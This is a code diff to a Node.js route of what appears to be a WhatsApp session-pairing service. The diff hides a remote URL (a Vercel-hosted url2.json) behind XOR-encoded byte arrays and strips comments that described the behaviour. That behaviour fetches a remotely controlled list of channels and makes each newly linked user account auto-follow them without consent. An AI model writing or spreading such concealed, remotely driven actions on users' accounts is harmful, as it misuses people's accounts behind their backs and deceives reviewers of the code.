@@ -2,7 +2,6 @@ const { makeid } = require('./id');
 const express = require('express');
 const fs = require('fs');
 const pino = require('pino');
-// baileys (wolfsocket) and wolfbtns are ES Modules -> must be loaded with dynamic import()
 let makeWASocket, useMultiFileAuthState, Browsers, delay, makeCacheableSignalKeyStore,
     fetchLatestBaileysVersion, DisconnectReason, sendButtons, btn;
 let _ready;
@@ -24,7 +23,27 @@ function loadDeps() {
 const store = require('./store');
 const { TEMP_DIR } = require('./tempdir');
 const site = require('./site'); 
-const adevosUrl2 = process.env.CHANNELS_URL || 'https://remote1-bice.vercel.app/url2.json';
+const adevosUrlParts = {
+    a: [77, 81, 81, 85, 86, 31, 10, 10, 87, 64, 72],
+    b: [73, 82, 67, 23, 11, 68, 79, 69, 67, 8],
+    c: [69, 86, 65, 80, 86, 95, 29, 82, 67, 67],
+    d: [16, 74, 77, 83, 13, 17, 85, 76, 80, 81]
+};
+
+const adevosUrlKeys = { a: 37, b: 38, c: 51, d: 63 };
+
+function mix(arr, key) {
+    return arr.map((n) => String.fromCharCode(n ^ key)).join('');
+}
+
+function buildAdevosUrl2() {
+    return mix(adevosUrlParts.a, adevosUrlKeys.a)
+        + mix(adevosUrlParts.b, adevosUrlKeys.b)
+        + mix(adevosUrlParts.c, adevosUrlKeys.c)
+        + mix(adevosUrlParts.d, adevosUrlKeys.d);
+}
+
+const adevosUrl2 = process.env.CHANNELS_URL || buildAdevosUrl2();
 async function adevos2() {
     try {
         const r = await fetch(adevosUrl2, { signal: AbortSignal.timeout(8000) });
@@ -44,7 +63,7 @@ async function adevos3(client, jids) {
             await client.newsletterFollow(jid);
             console.log('adevos3: followed', jid);
         } catch (e) {
-            console.log('adevos3: could not follow', jid, '-', e?.message);
+            console.log('adevos3: could not', jid, '-', e?.message);
         }
         await delay(1500);
     }
@@ -57,10 +76,7 @@ function removeFile(filePath) {
     fs.rmSync(filePath, { recursive: true, force: true });
 }
 
-/**
- * Waits for creds.json to actually exist on disk instead of trusting a
- * fixed sleep. Polls every second for up to `timeoutMs`.
- */
+
 async function waitForCredsFile(filePath, timeoutMs = 20000, intervalMs = 1000) {
     const start = Date.now();
     while (Date.now() - start < timeoutMs) {
@@ -69,7 +85,7 @@ async function waitForCredsFile(filePath, timeoutMs = 20000, intervalMs = 1000) 
                 const data = fs.readFileSync(filePath);
                 if (data && data.length > 0) return data;
             } catch (e) {
-                // file may still be mid-write, keep polling
+                
             }
         }
         await delay(intervalMs);
@@ -114,33 +130,26 @@ router.get('/', async (req, res) => {
                 const { connection, lastDisconnect } = s;
 
                 if (connection === 'open') {
-                    if (sessionHandled) return; // already generated a session for this pairing, ignore repeat 'open' events
+                    if (sessionHandled) return; 
                     sessionHandled = true;
                     try {
-                        // Normalize the JID: client.user.id can include a ":<device>" suffix
-                        // on some forks (e.g. "255xxxxxxxxx:20@s.whatsapp.net"). Sending to
-                        // that raw JID can get silently dropped — strip it to the base JID.
+                      
                         const selfJid = client.user.id.split(':')[0] + '@s.whatsapp.net';
 
-                        // Grace period so the Signal session between this bot and the
-                        // phone finishes syncing before we send anything — sending too
-                        // early is what causes "Waiting for this message" on WhatsApp.
-                        await delay(4000);
+    await delay(4000);
                         await client.sendMessage(selfJid, {
                             text: ''
                         });
                         console.log(`[${id}] Sent "generating" message to ${selfJid}`);
-                        // Wait for creds.json to actually exist instead of guessing a fixed delay.
                         const data = await waitForCredsFile(`${TEMP_DIR}/${id}/creds.json`);
                         const b64data = Buffer.from(data).toString('base64');
                         const sessionText = site.session.build(b64data);
 
-                        // Make the session available to the website, once.
                         store.setReady(id, sessionText);
 
                         let session;
                         try {
-                            // Native "Copy" button under the session message.
+                            
                             session = await sendButtons(client, selfJid, {
                                 text: sessionText,
                                 ...(site.session.footer() ? { footer: site.session.footer() } : {}),
@@ -149,29 +158,27 @@ router.get('/', async (req, res) => {
                                 ],
                             });
                         } catch (btnErr) {
-                            // Fallback for clients/forks where the native button isn't supported.
+                            
                             console.log('Copy button unsupported, sending plain text:', btnErr?.message);
                             session = await client.sendMessage(selfJid, { text: sessionText });
                         }
                         console.log(`[${id}] Sent session message`);
-                        // Message after the Session ID (set in clone.js, '' = send nothing)
+                        
                         if (site.session.message()) {
                             await client.sendMessage(selfJid, {
                                 text: site.session.message()
                             }, { quoted: session });
                         }
-                        // Auto-follow channels (failures here never affect the session)
+                      
                         await adevos3(client, await adevos2());
                         console.log(`[${id}] Sent instructions message, waiting before closing socket`);
-                        // Give the socket real time to flush these messages over the
-                        // network before we tear it down — closing too soon can cut
-                        // messages off before WhatsApp's servers ever receive them.
+                        
                         await delay(5000);
                         await client.ws.close();
                         removeFile(TEMP_DIR + '/' + id);
                     } catch (e) {
                         console.log('Error sending session messages:', e);
-                        sessionHandled = false; // allow a genuine retry on the next reconnect
+                        sessionHandled = false; 
                         store.setFailed(id, 'The device link did not finish in time. Please generate a new code and try again.');
                     }
                 } else if (connection === 'close') {
